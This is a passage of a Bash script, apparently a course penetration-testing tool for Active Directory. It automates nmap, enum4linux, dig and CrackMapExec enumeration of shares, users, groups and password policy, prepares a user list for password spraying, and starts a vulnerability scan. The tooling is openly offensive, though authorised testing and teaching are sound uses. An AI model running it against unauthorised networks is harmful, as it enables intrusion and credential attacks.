        # 20/tcp FTP-DATA, 21/tcp FTP, 22/tcp SSH, 137/udp NetBIOS-NS, 138/udp NetBIOS-DGM, 139/tcp NetBIOS-SSN, 389/tcp LDAP, 389/udp LDAP, 445/tcp SMB, 636/tcp LDAPS, 5985/tcp WinRM-HTTP, 5986/tcp WinRM-HTTPS, 3389/tcp RDP
        local key_service_ports="20|21|22|137|138|139|445|5985|5986|389|636|3389"
        local nmap_key_services_output="${OUTPUT_DIR}/nmap_key_services_scan.txt"
        # nmap -Pn -p20,21,22,137,138,13,445,5985,5986,389,636,3389
        
        start_spinner "Extracting key services from consolidated scan results"
        echo # Newline after spinner start
        
        echo -e "\n--- Discovered Key Services Summary ---" | tee -a "$ENUMERATION_LOG"
        
        # The awk command will now directly process NMAP_ALL_SERVICE_SCAN_OUTPUT
        # and filter/format the output.
        awk '
        /Nmap scan report for/ {
            # Extract IP address from "Nmap scan report for X.X.X.X" line
            current_ip = $NF;
            gsub(/\(|\)/, "", current_ip); # Remove parentheses if present
            next;
        }
        # This pattern matches lines like "21/tcp open  ftp" or "137/udp open  netbios-ns"
        # It also handles variations like "445/tcp open  microsoft-ds" where service name is multiple words.
        /^[0-9]+\/(tcp|udp)\s+open/ {
            # $1 is "PORT/PROTOCOL", $2 is "STATE", $3...$NF is "SERVICE"
            split($1, port_proto, "/");
            port = port_proto[1];
            protocol = port_proto[2];
            
            # Reconstruct service name (can be multiple words)
            service = "";
            for (i = 3; i <= NF; i++) {
                service = service (i == 3 ? "" : " ") $i;
            }

            # Check if the port matches any of the key service ports
            if (port == "20" || port == "21" || port == "22" || \
                port == "137" || port == "138" || port == "139" || port == "445" || \
                port == "5985" || port == "5986" || port == "389" || port == "636" || port == "3389") {
                printf "  - %s Port %s/%s (%s)\n", current_ip, port, protocol, service;
            }
        }
        ' "$NMAP_ALL_SERVICE_SCAN_OUTPUT" | sort -u | tee -a "$nmap_key_services_output" | tee -a "$ENUMERATION_LOG"
        
        stop_spinner
        echo # Ensure a clean line after spinner

        if [ ! -s "$nmap_key_services_output" ]; then
            echo -e "  - No open key services (FTP, SSH, SMB, WinRM, LDAP, RDP) found in consolidated scan results." | tee -a "$ENUMERATION_LOG"
        fi
      
        # 3.2.2. Enumerate shared folders.
        echo -e "${GREEN}[+] 3.2.2. Enumerating shared folders using Nmap NSE script: smb-enum-shares.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        
        # Re-added -sV flag
        local smb_enum_cmd_array=(sudo nmap -Pn -sV -p 139,445 --script smb-enum-shares -oN "${OUTPUT_DIR}/nmap_smb_shares.txt")
        if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
            smb_enum_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
        fi

        rm -f "${OUTPUT_DIR}/nmap_smb_shares.txt" # Clean old output file

        start_spinner "Enumerating SMB shares"
        echo # Newline after spinner start
        echo -e "${CYAN}Executing: ${BLUE}${smb_enum_cmd_array[*]} $(echo "$live_hosts" | tr ',' ' ')${NC}" | tee -a "$ENUMERATION_LOG"
        {
          echo -e "\n--- Nmap NSE Script Results: SMB Shared Folders ---" >> "$ENUMERATION_LOG"
          "${smb_enum_cmd_array[@]}" $(echo "$live_hosts" | tr ',' ' ') 2>&1 | tee -a "$ENUMERATION_LOG"
        }
        local nmap_smb_exit_code=${PIPESTATUS[0]}
        stop_spinner
        echo # Ensure a clean line after spinner
        if [ "$nmap_smb_exit_code" -ne 0 ]; then 
            echo -e "${RED}[!] ERROR: Nmap smb-enum-shares script failed with exit code $nmap_smb_exit_code. SMB shares may not be available or accessible.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

        # Populate DISCOVERED_SMB_SHARES for summary
        DISCOVERED_SMB_SHARES=$(grep -E '^\s*\|\s*sharename:\s+' "${OUTPUT_DIR}/nmap_smb_shares.txt" | awk -F': ' '{print $2}' | sort | uniq | paste -s -d, -)

        # 3.2.3. Add three (3) NSE scripts you think can be relevant for enumerating domain networks.
        echo -e "${GREEN}[+] 3.2.3. Running Nmap NSE scripts relevant for enumerating domain networks (ldap-search, smb-enum-domains, krb5-enum-users, smb-os-discovery).${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        
        # Clean old output file for combined NSE scripts
        rm -f "${OUTPUT_DIR}/nmap_other_nse_enum.txt"

        # ldap-search on ports 389, 636
        echo -e "\n--- Running Nmap NSE Script: ldap-search (Ports 389, 636) ---" | tee -a "$ENUMERATION_LOG"
        start_spinner "Running ldap-search script"
        local ldap_search_cmd_array=(sudo nmap -Pn -sV -p 389,636 --script ldap-search -oN "${OUTPUT_DIR}/nmap_ldap_search.txt")
        if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
            ldap_search_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
        fi
        echo -e "${CYAN}Executing: ${BLUE}${ldap_search_cmd_array[*]} $(echo "$live_hosts" | tr ',' ' ')${NC}" | tee -a "$ENUMERATION_LOG"
        # Changed: Redirect Nmap output to its own file AND tee to ENUMERATION_LOG and terminal
        "${ldap_search_cmd_array[@]}" $(echo "$live_hosts" | tr ',' ' ') 2>&1 | tee "${OUTPUT_DIR}/nmap_ldap_search.txt" | tee -a "$ENUMERATION_LOG"
        local ldap_search_exit_code=${PIPESTATUS[0]}
        stop_spinner
        if [ "$ldap_search_exit_code" -ne 0 ]; then 
            echo -e "${YELLOW}[!] WARNING: Nmap ldap-search script failed with exit code $ldap_search_exit_code.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi
        echo # Newline after spinner

        # smb-enum-domains on ports 139, 445
        echo -e "\n--- Running Nmap NSE Script: smb-enum-domains (Ports 139, 445) ---" | tee -a "$ENUMERATION_LOG"
        start_spinner "Running smb-enum-domains script"
        local smb_enum_domains_cmd_array=(sudo nmap -Pn -sV -p 139,445 --script smb-enum-domains -oN "${OUTPUT_DIR}/nmap_smb_enum_domains.txt")
        if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
            smb_enum_domains_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
        fi
        echo -e "${CYAN}Executing: ${BLUE}${smb_enum_domains_cmd_array[*]} $(echo "$live_hosts" | tr ',' ' ')${NC}" | tee -a "$ENUMERATION_LOG"
        # Changed: Redirect Nmap output to its own file AND tee to ENUMERATION_LOG and terminal
        "${smb_enum_domains_cmd_array[@]}" $(echo "$live_hosts" | tr ',' ' ') 2>&1 | tee "${OUTPUT_DIR}/nmap_smb_enum_domains.txt" | tee -a "$ENUMERATION_LOG"
        local smb_enum_domains_exit_code=${PIPESTATUS[0]}
        stop_spinner
        if [ "$smb_enum_domains_exit_code" -ne 0 ]; then 
            echo -e "${YELLOW}[!] WARNING: Nmap smb-enum-domains script failed with exit code $smb_enum_domains_exit_code.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi
        echo # Newline after spinner

        # krb5-enum-users on port 88
        echo -e "\n--- Running Nmap NSE Script: krb5-enum-users (Port 88) ---" | tee -a "$ENUMERATION_LOG"
        start_spinner "Running krb5-enum-users script"
        local krb5_enum_users_cmd_array=(sudo nmap -Pn -sV -p 88 --script krb5-enum-users -oN "${OUTPUT_DIR}/nmap_krb5_enum_users.txt")
        if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
            krb5_enum_users_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
        fi
        echo -e "${CYAN}Executing: ${BLUE}${krb5_enum_users_cmd_array[*]} $(echo "$live_hosts" | tr ',' ' ')${NC}" | tee -a "$ENUMERATION_LOG"
        # Changed: Redirect Nmap output to its own file AND tee to ENUMERATION_LOG and terminal
        "${krb5_enum_users_cmd_array[@]}" $(echo "$live_hosts" | tr ',' ' ') 2>&1 | tee "${OUTPUT_DIR}/nmap_krb5_enum_users.txt" | tee -a "$ENUMERATION_LOG"
        local krb5_enum_users_exit_code=${PIPESTATUS[0]}
        stop_spinner
        if [ "$krb5_enum_users_exit_code" -ne 0 ]; then 
            echo -e "${YELLOW}[!] WARNING: Nmap krb5-enum-users script failed with exit code $krb5_enum_users_exit_code.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi
        echo # Newline after spinner

        # smb-os-discovery on ports 139, 445
        echo -e "\n--- Running Nmap NSE Script: smb-os-discovery (Ports 139, 445) ---" | tee -a "$ENUMERATION_LOG"
        start_spinner "Running smb-os-discovery script"
        local smb_os_discovery_cmd_array=(sudo nmap -Pn -sV -p 139,445 --script smb-os-discovery -oN "${OUTPUT_DIR}/nmap_smb_os_discovery_nse.txt")
        if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
            smb_os_discovery_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
        fi
        echo -e "${CYAN}Executing: ${BLUE}${smb_os_discovery_cmd_array[*]} $(echo "$live_hosts" | tr ',' ' ')${NC}" | tee -a "$ENUMERATION_LOG"
        # Changed: Redirect Nmap output to its own file AND tee to ENUMERATION_LOG and terminal
        "${smb_os_discovery_cmd_array[@]}" $(echo "$live_hosts" | tr ',' ' ') 2>&1 | tee "${OUTPUT_DIR}/nmap_smb_os_discovery_nse.txt" | tee -a "$ENUMERATION_LOG"
        local smb_os_discovery_nse_exit_code=${PIPESTATUS[0]}
        stop_spinner
        if [ "$smb_os_discovery_nse_exit_code" -ne 0 ]; then 
            echo -e "${YELLOW}[!] WARNING: Nmap smb-os-discovery script failed with exit code $smb_os_discovery_nse_exit_code.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi
        echo # Newline after spinner

        # Consolidate all individual NSE script outputs into nmap_other_nse_enum.txt
        echo -e "${CYAN}[i] Consolidating individual NSE script outputs into: ${OUTPUT_DIR}/nmap_other_nse_enum.txt${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        start_spinner "Consolidating NSE script outputs"
        {
            echo "--- Consolidated Nmap Other NSE Script Results ---" > "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
            if [ -f "${OUTPUT_DIR}/nmap_ldap_search.txt" ] && [ -s "${OUTPUT_DIR}/nmap_ldap_search.txt" ]; then
                echo -e "\n--- ldap-search Results ---" >> "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
                cat "${OUTPUT_DIR}/nmap_ldap_search.txt" >> "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
            fi
            if [ -f "${OUTPUT_DIR}/nmap_smb_enum_domains.txt" ] && [ -s "${OUTPUT_DIR}/nmap_smb_enum_domains.txt" ]; then
                echo -e "\n--- smb-enum-domains Results ---" >> "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
                cat "${OUTPUT_DIR}/nmap_smb_enum_domains.txt" >> "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
            fi
            if [ -f "${OUTPUT_DIR}/nmap_krb5_enum_users.txt" ] && [ -s "${OUTPUT_DIR}/nmap_krb5_enum_users.txt" ]; then
                echo -e "\n--- krb5-enum-users Results ---" >> "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
                cat "${OUTPUT_DIR}/nmap_krb5_enum_users.txt" >> "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
            fi
            if [ -f "${OUTPUT_DIR}/nmap_smb_os_discovery_nse.txt" ] && [ -s "${OUTPUT_DIR}/nmap_smb_os_discovery_nse.txt" ]; then
                echo -e "\n--- smb-os-discovery Results ---" >> "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
                cat "${OUTPUT_DIR}/nmap_smb_os_discovery_nse.txt" >> "${OUTPUT_DIR}/nmap_other_nse_enum.txt"
            fi
        }
        stop_spinner
        echo -e "${GREEN}[+] All additional Nmap NSE scripts completed. Results consolidated to: ${OUTPUT_DIR}/nmap_other_nse_enum.txt${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"


        # 3.2.4. Performing unauthenticated SMB enumeration using enum4linux.
        if command -v enum4linux &> /dev/null; then
            echo -e "${GREEN}[+] 3.2.4. Enumerating SMB information using enum4linux (unauthenticated).${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            echo # Newline
            rm -f "${OUTPUT_DIR}/enum4linux_output.txt" # Clean old output file
            for host in $(echo "$live_hosts" | tr ',' ' '); do
                echo -e "\n${CYAN}Executing: enum4linux -a $host${NC}"
                start_spinner "Running enum4linux on $host"
                echo # Newline after spinner start
                {
                    echo -e "\n--- Enum4Linux Results for $host (Unauthenticated) ---" >> "${OUTPUT_DIR}/enum4linux_output.txt"
                    # Command array for safety with potential special characters
                    local enum4linux_cmd_array=(enum4linux -a "$host")
                    "${enum4linux_cmd_array[@]}" 2>&1 | tee -a "${OUTPUT_DIR}/enum4linux_output.txt"
                }
                local enum4linux_exit_code=${PIPESTATUS[0]}
                stop_spinner
                echo # Ensure a clean line after spinner
                if [ "$enum4linux_exit_code" -ne 0 ]; then 
                    echo -e "${YELLOW}[!] WARNING: enum4linux on $host failed or found no information with exit code $enum4linux_exit_code. SMB service might be unavailable or null sessions are not allowed.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
                fi
            done
        else
            echo -e "${YELLOW}[!] WARNING: enum4linux not found. Skipping unauthenticated SMB enumeration.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

        # 3.2.5. Perform DNS enumeration using dig for AD SRV records
        if command -v dig &> /dev/null && [ -n "$AD_DOMAIN_NAME" ]; then # Changed from DOMAIN_NAME
            echo -e "${GREEN}[+] 3.2.5. Performing DNS enumeration using dig for Active Directory SRV records.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            echo # Newline
            rm -f "${OUTPUT_DIR}/dns_enum_output.txt" # Clean old output file
            {
                echo -e "\n--- DNS SRV Record Enumeration (dig) ---" >> "${OUTPUT_DIR}/dns_enum_output.txt"
                # Discover LDAP services in the domain
                local dig_ldap_cmd_array=(dig +short SRV _ldap._tcp.dc._msdcs."$AD_DOMAIN_NAME") # Changed from DOMAIN_NAME
                echo "LDAP SRV Records for _ldap._tcp.dc._msdcs.${AD_DOMAIN_NAME}:" # Changed from DOMAIN_NAME
                start_spinner "Querying LDAP SRV records"
                echo # Newline after spinner start
                echo -e "${CYAN}Executing: ${BLUE}${dig_ldap_cmd_array[*]}${NC}" | tee -a "$ENUMERATION_LOG"
                "${dig_ldap_cmd_array[@]}" 2>&1 | tee -a "${OUTPUT_DIR}/dns_enum_output.txt"
                stop_spinner
                echo # Ensure a clean line after spinner
                # Discover Kerberos services
                local dig_kerberos_cmd_array=(dig +short SRV _kerberos._tcp.dc._msdcs."$AD_DOMAIN_NAME") # Changed from DOMAIN_NAME
                echo "Kerberos SRV Records for _kerberos._tcp.dc._msdcs.${AD_DOMAIN_NAME}:" # Changed from DOMAIN_NAME
                start_spinner "Querying Kerberos SRV records"
                echo # Newline after spinner start
                echo -e "${CYAN}Executing: ${BLUE}${dig_kerberos_cmd_array[*]}${NC}" | tee -a "$ENUMERATION_LOG"
                "${dig_kerberos_cmd_array[@]}" 2>&1 | tee -a "${OUTPUT_DIR}/dns_enum_output.txt"
                stop_spinner
                echo # Newline after spinner
                # Discover Global Catalog services
                local dig_gc_cmd_array=(dig +short SRV _gc._tcp.dc._msdcs."$AD_DOMAIN_NAME") # Changed from DOMAIN_NAME
                echo "Global Catalog SRV Records for _gc._tcp.dc._msdcs.${AD_DOMAIN_NAME}:" # Changed from DOMAIN_NAME
                start_spinner "Querying Global Catalog SRV records"
                echo # Newline after spinner start
                echo -e "${CYAN}Executing: ${BLUE}${dig_gc_cmd_array[*]}${NC}" | tee -a "$ENUMERATION_LOG"
                "${dig_gc_cmd_array[@]}" 2>&1 | tee -a "${OUTPUT_DIR}/dns_enum_output.txt"
                stop_spinner
                echo # Newline after spinner
            } | tee -a "$ENUMERATION_LOG" # Teeing the whole block, including output of tee-ed dig commands
            local dig_exit_code=${PIPESTATUS[0]}
            if [ "$dig_exit_code" -ne 0 ]; then 
                echo -e "${YELLOW}[!] WARNING: dig DNS enumeration failed with exit code $dig_exit_code. Check domain name or DNS server reachability.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            fi
        else
            echo -e "${CYAN}[i] Skipping DNS enumeration: dig not found or Domain name not provided.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

    fi

    # 3.3. Advanced (Only if AD credentials were entered):
    if [ "$ENUM_LEVEL" -ge 3 ]; then
        echo -e "${GREEN}[+] 3.3. Performing Advanced Enumeration.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        if [ -z "$AD_USER" ] || [ -z "$AD_PASS" ]; then
            echo -e "${YELLOW}[!] WARNING: Advanced Enumeration (Level 3) requires AD credentials, which were not provided. Skipping.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            return # Skip if credentials are missing
        fi
        if [ -z "$AD_DOMAIN_NAME" ]; then # Changed from DOMAIN_NAME
            echo -e "${RED}[!] ERROR: Advanced Enumeration (Level 3) requires a domain name to be provided. Skipping.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            return # Skip if domain name is missing
        fi

        echo -e "${GREEN}[+] Performing Advanced Enumeration with CrackMapExec${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        # Clean old CrackMapExec output files before running
        rm -f "${OUTPUT_DIR}/domain_users.txt"

        {
          echo -e "\n--- Advanced Enumeration with CrackMapExec ---" >> "$ENUMERATION_LOG"
          # 3.3.1. Extract all users.
          local cme_users_cmd_array=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN_NAME" --users) # Changed from DOMAIN_NAME
          echo -e "\n--- 3.3.1. Extracting all domain users ---"
          start_spinner "Extracting domain users"
          echo # Newline after spinner start
          echo -e "${CYAN}Executing: ${BLUE}${cme_users_cmd_array[*]}${NC}" | tee -a "$ENUMERATION_LOG"
          # Execute CME, tee output to enumeration log, then filter for usernames and save to file
          # Strip ANSI escape codes before processing
          local cme_output_for_users=$("${cme_users_cmd_array[@]}" 2>&1)
          echo "$cme_output_for_users" | tee -a "$ENUMERATION_LOG"
          echo "$cme_output_for_users" | grep '^\s*\[\+\]\s\S\+:\S\+\s+\S\+\s+.*\\.*$' | \
            awk '{print $NF}' | cut -d'\' -f2 | sort -u > "${OUTPUT_DIR}/domain_users.txt"
          stop_spinner
          echo # Newline after spinner
          
          # 3.3.2. Extract all groups.
          local cme_groups_cmd_array=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN_NAME" --groups) # Changed from DOMAIN_NAME
          echo -e "\n--- 3.3.2. Extracting all domain groups ---"
          start_spinner "Extracting domain groups"
          echo # Newline after spinner start
          echo -e "${CYAN}Executing: ${BLUE}${cme_groups_cmd_array[*]}${NC}" | tee -a "$ENUMERATION_LOG"
          "${cme_groups_cmd_array[@]}" 2>&1 | tee -a "$ENUMERATION_LOG"
          stop_spinner
          echo # Newline after spinner
          # 3.3.3. Extract all shares.
          local cme_shares_cmd_array=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN_NAME" --shares) # Changed from DOMAIN_NAME
          echo -e "\n--- 3.3.3. Extracting all shares ---"
          start_spinner "Extracting shares"
          echo # Newline after spinner start
          echo -e "${CYAN}Executing: ${BLUE}${cme_shares_cmd_array[*]}${NC}" | tee -a "$ENUMERATION_LOG"
          "${cme_shares_cmd_array[@]}" 2>&1 | tee -a "$ENUMERATION_LOG"
          stop_spinner
          echo # Newline after spinner
          # 3.3.4. Display password policy.
          local cme_passpol_cmd_array=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN_NAME" --pass-pol) # Changed from DOMAIN_NAME
          echo -e "\n--- 3.3.4. Displaying password policy ---"
          start_spinner "Displaying password policy"
          echo # Newline after spinner start
          echo -e "${CYAN}Executing: ${BLUE}${cme_passpol_cmd_array[*]}${NC}" | tee -a "$ENUMERATION_LOG"
          "${cme_passpol_cmd_array[@]}" 2>&1 | tee -a "$ENUMERATION_LOG"
          stop_spinner
          echo # Newline after spinner
          # 3.3.5. Find disabled accounts.
          local cme_ridbrute_base_cmd=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN_NAME" --users) # Changed from DOMAIN_NAME
          echo -e "\n--- 3.3.5. Finding disabled accounts ---"
          start_spinner "Finding disabled accounts"
          echo # Newline after spinner start
          echo -e "${CYAN}Executing: ${BLUE}${cme_ridbrute_base_cmd[*]} | grep -i "disabled"${NC}" | tee -a "$ENUMERATION_LOG"
          # Strip ANSI escape codes before grep
          "${cme_ridbrute_base_cmd[@]}" 2>&1 | grep -i "disabled" | tee -a "$ENUMERATION_LOG"
          stop_spinner
          echo # Newline after spinner
          # 3.3.6. Find never-expired accounts.
          local cme_passnotexpire_base_cmd=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN_NAME" --users) # Changed from DOMAIN_NAME
          echo -e "\n--- 3.3.6. Finding never-expired accounts ---"
          start_spinner "Finding never-expired accounts"
          echo # Newline after spinner start
          echo -e "${CYAN}Executing: ${BLUE}${cme_passnotexpire_base_cmd[*]}" | tee -a "$ENUMERATION_LOG"
          # Strip ANSI escape codes before grep
          "${cme_passnotexpire_base_cmd[@]}" 2>&1 | grep -Ei "password never expires|PasswordNeverExpires" | tee -a "$ENUMERATION_LOG"
          stop_spinner
          echo # Newline after spinner
          # 3.3.7. Display accounts that are members of the Domain Admins group.
          local cme_admins_base_cmd=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN_NAME" --local-groups) # Changed from DOMAIN_NAME
          echo -e "\n--- 3.3.7. Displaying accounts that are members of the Domain Admins group ---"
          start_spinner "Displaying Domain Admins group members"
          echo # Newline after spinner start
          echo -e "${CYAN}Executing: ${BLUE}${cme_admins_base_cmd[*]}${NC}" | tee -a "$ENUMERATION_LOG"
          "${cme_admins_base_cmd[@]}" 2>&1 | grep -i "Domain Admins" | tee -a "$ENUMERATION_LOG"
          stop_spinner
          echo # Newline after spinner
        }
        local cme_exit_code=${PIPESTATUS[0]}
        if [ "$cme_exit_code" -ne 0 ]; then 
            echo -e "${RED}[!] ERROR: CrackMapExec advanced enumeration failed with exit code $cme_exit_code. Check credentials, domain name, and target connectivity.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi

        # --- Consolidate all discovered users into domain_users.txt ---
        echo -e "${CYAN}[i] Consolidating all discovered users from enumeration logs.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        local temp_all_users_file="${OUTPUT_DIR}/temp_all_users.txt"
        rm -f "$temp_all_users_file" # Clear temp file

        # Add users from the initial CrackMapExec --users run (3.3.1)
        if [ -f "${OUTPUT_DIR}/domain_users.txt" ] && [ -s "${OUTPUT_DIR}/domain_users.txt" ]; then
            cat "${OUTPUT_DIR}/domain_users.txt" >> "$temp_all_users_file"
        fi

        # Add users found via grep on the entire enumeration log
        if [ -n "$AD_DOMAIN_NAME" ] && [ -f "$ENUMERATION_LOG" ] && [ -s "$ENUMERATION_LOG" ]; then # Changed from DOMAIN_NAME
            start_spinner "Extracting additional users from enumeration log"
            echo # Newline after spinner start
            # The grep command provided by the user
            grep -oE "$AD_DOMAIN_NAME\\\\[^[:space:]]+" "$ENUMERATION_LOG" | sed "s/$AD_DOMAIN_NAME\\\\//" >> "$temp_all_users_file" # Changed from DOMAIN_NAME
            stop_spinner
            echo # Newline after spinner
        fi

        # Finalize domain_users.txt by sorting and unique-ing the temporary file
        if [ -f "$temp_all_users_file" ] && [ -s "$temp_all_users_file" ]; then
            sort -u "$temp_all_users_file" > "${OUTPUT_DIR}/domain_users.txt"
            echo -e "${GREEN}[+] Consolidated user list created at: ${OUTPUT_DIR}/domain_users.txt${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        else
            echo -e "${YELLOW}[!] WARNING: No users found after consolidation. Password spraying might be limited.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            # If no users are found, ensure domain_users.txt is empty or doesn't exist to prevent issues
            rm -f "${OUTPUT_DIR}/domain_users.txt"
        fi
        rm -f "$temp_all_users_file" # Clean up temp file

        # --- MOVED: Fallback for domain_users.txt if no users were extracted by CME or other methods ---
        # This block is now placed after all consolidation attempts
        if [ ! -s "${OUTPUT_DIR}/domain_users.txt" ]; then # -s checks if file exists and is not empty
            echo -e "${YELLOW}[!] No domain users extracted by CrackMapExec or other enumeration methods. Attempting to use fallback userlist: /usr/share/wordlists/users.txt${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            if [ -f "/usr/share/wordlists/users.txt" ]; then
                cp "/usr/share/wordlists/users.txt" "${OUTPUT_DIR}/domain_users.txt"
                echo -e "${GREEN}[+] Fallback userlist copied to ${OUTPUT_DIR}/domain_users.txt.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            else
                echo -e "${RED}[!] Fallback userlist /usr/share/wordlists/users.txt not found. No userlist will be used for password spraying.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
            fi
        fi

        # Populate DISCOVERED_DOMAIN_USERS for summary
        if [ -f "${OUTPUT_DIR}/domain_users.txt" ] && [ -s "${OUTPUT_DIR}/domain_users.txt" ]; then
            DISCOVERED_DOMAIN_USERS=$(cat "${OUTPUT_DIR}/domain_users.txt" | paste -s -d, -)
            echo -e "${GREEN}[+] Discovered Domain Users: ${DISCOVERED_DOMAIN_USERS}${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        else
            echo -e "${YELLOW}[!] WARNING: No domain users extracted, password spraying might be limited.${NC}" | tee -a "$LOG_FILE" | tee -a "$ENUMERATION_LOG"
        fi
    fi
}

# --- 4. Exploitation Mode: ---
run_exploitation() {
    if [ "$EXPLOIT_LEVEL" -eq 0 ]; then
        print_stage "4. Exploitation Mode Skipped" | tee -a "$LOG_FILE"
        return
    fi

    local level_name
    case "$EXPLOIT_LEVEL" in
        1) level_name="Basic" ;;
        2) level_name="Intermediate" ;;
        3) level_name="Advanced" ;;
        *) level_name="Unknown" ;;
    esac
    print_stage "4. Exploitation Mode (Level: $EXPLOIT_LEVEL - $level_name)" | tee -a "$LOG_FILE"
    
    # Determine the 'live_hosts' for exploitation: either discovered live hosts, or the entire target range as a fallback.
    local live_hosts="$([ -n "$DISCOVERED_LIVE_HOSTS" ] && echo "$DISCOVERED_LIVE_HOSTS" || echo "$TARGET_RANGE")"

    if [ -z "$DISCOVERED_LIVE_HOSTS" ]; then
        echo -e "${YELLOW}[!] No online TCP hosts found from the scanning phase (2.1). Proceeding with exploitation on the *entire target range*: $live_hosts${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
    else
        echo -e "${GREEN}[+] Proceeding with exploitation on identified online TCP hosts from 2.1: $live_hosts${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
    fi


    # 4.1. Basic: Deploy the NSE vulnerability scanning script.
    if [ "$EXPLOIT_LEVEL" -ge 1 ]; then
        echo -e "${GREEN}[+] 4.1. Basic Exploitation: Deploying the NSE vulnerability scanning script.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
        
        local nmap_vuln_cmd_array=(sudo nmap -sV --script vuln -oN "${OUTPUT_DIR}/nmap_vuln_scan.txt")
        if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
            nmap_vuln_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
        fi

        rm -f "${OUTPUT_DIR}/nmap_vuln_scan.txt" # Clean old output file

        start_spinner "Running Nmap vulnerability scan"
        echo # Newline after spinner start
        echo -e "${CYAN}Executing: ${BLUE}${nmap_vuln_cmd_array[*]} $(echo "$live_hosts" | tr ',' ' ')${NC}" | tee -a "$EXPLOITATION_LOG"
        # Execute the command and direct ALL output to the main Nmap vuln scan file.
        {
          echo -e "\n--- Nmap Vulnerability Scan (--script vuln) ---" >> "$EXPLOITATION_LOG"
          "${nmap_vuln_cmd_array[@]}" $(echo "$live_hosts" | tr ',' ' ') 2>&1 | tee -a "$EXPLOITATION_LOG"
        }
        local nmap_vuln_exit_code=${PIPESTATUS[0]}
        stop_spinner
        echo # Newline after spinner

        if [ "$nmap_vuln_exit_code" -ne 0 ]; then 
            echo -e "${RED}[!] ERROR: Nmap vulnerability scan failed with exit code $nmap_vuln_exit_code. This could mean no vulnerabilities were detected or there was a scanning issue.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
        else
            # Check for identified vulnerabilities from the nmap_vuln_scan.txt file
            local vuln_count=$(grep -c -E 'VULNERABLE|CVE-|CNVD-|Vuln: |State: VULNERABLE' "${OUTPUT_DIR}/nmap_vuln_scan.txt")
            if [ "$vuln_count" -gt 0 ]; then
